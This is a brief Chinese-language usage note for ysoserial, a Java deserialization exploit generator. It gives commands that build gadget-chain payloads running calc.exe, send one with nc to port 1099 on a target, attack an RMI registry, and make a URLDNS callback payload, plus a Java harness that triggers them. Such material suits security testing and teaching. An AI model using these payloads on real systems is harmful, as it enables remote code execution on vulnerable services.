Ysoserial 
<https://github.com/frohoff/ysoserial>
一款用于生成利用不安全的Java对象反序列化的有效负载的概念验证工具。
图形化优化版可以直接导出：<https://github.com/0ofo/Deswing> 
## **使用**
使用生成命令：
```
java -jar ysoserial.jar
java -jar ysoserial.jar [payload] '[command]'
```
案例：
```
$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
$ nc 10.10.10.10 1099 < groovypayload.bin

$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
```

对生成后的文件进行反序列化，存在对应的依赖，则可以触发。
```
 java -jar ysoserial.jar CommonsCollections7 calc.exe >cc7.bin
 java -jar ysoserial.jar URLDNS http://dnslog.cn >url.bin
```
```
public static Object DeSerializable(String path) throws IOException, ClassNotFoundException {
    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
    return ois.readObject();
}

public static void main(String[] args) throws IOException, ClassNotFoundException {

    new ArrayStack();
    DeSerializable("src/cc7.bin");
}
```

